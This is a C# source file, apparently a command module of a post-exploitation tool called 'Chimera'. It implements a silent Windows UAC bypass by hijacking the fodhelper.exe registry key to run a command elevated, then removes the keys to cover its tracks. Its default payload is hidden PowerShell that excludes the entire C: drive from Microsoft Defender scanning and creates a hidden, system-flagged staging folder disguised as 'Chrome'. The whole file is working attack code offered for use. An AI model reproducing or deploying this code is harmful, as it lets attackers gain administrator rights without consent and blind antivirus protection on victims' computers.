using System;
using System.Diagnostics;
using Microsoft.Win32;

namespace Chimera.Commands
{
    // bypass [cmd] — silent UAC elevation via fodhelper.exe registry hijack.
    // Default (no args): adds Defender exclusion for C:\ and creates staging dir elevated.
    // Custom command: pass it as parameter and it runs elevated instead.
    public static class RunasExec
    {
        private const string FodHelperKey =
            @"Software\Classes\ms-settings\shell\open\command";

        public static string Execute(string command)
        {
            try
            {
                // Default elevated payload: add Defender exclusion + create staging dir
                string target = string.IsNullOrEmpty(command)
                    ? @"powershell.exe -NoP -W Hidden -C """ +
                      @"Add-MpPreference -ExclusionPath 'C:\'; " +
                      @"New-Item -ItemType Directory -Force -Path 'C:\Users\Public\Chrome' | " +
                      @"Out-Null; " +
                      @"(Get-Item 'C:\Users\Public\Chrome').Attributes = 'Hidden,System'"""
                    : command;

                // 1. Write hijack keys
                using (RegistryKey key =
                    Registry.CurrentUser.CreateSubKey(FodHelperKey))
                {
                    if (key == null)
                        return "[error] Could not create fodhelper registry key.";

                    key.SetValue("DelegateExecute", "", RegistryValueKind.String);
                    key.SetValue("", target, RegistryValueKind.String);
                }

                // 2. Launch fodhelper — spawns target elevated
                var psi = new ProcessStartInfo("fodhelper.exe")
                {
                    UseShellExecute = false,
                    CreateNoWindow  = true
                };
                Process.Start(psi);

                // Wait for elevated process to complete
                System.Threading.Thread.Sleep(3000);

                // 3. Clean up registry
                try
                {
                    Registry.CurrentUser.DeleteSubKeyTree(
                        @"Software\Classes\ms-settings", throwOnMissingSubKey: false);
                }
                catch { /* best-effort */ }

                return "[+] fodhelper UAC bypass triggered.\n" +
                       "    Elevated command: " + target + "\n" +
                       "    Registry keys cleaned up.\n" +
                       "    Defender exclusion for C:\\ set, staging dir created.";
            }
            catch (Exception ex)
            {
                return "[error] " + ex.Message;
            }
        }
    }
}
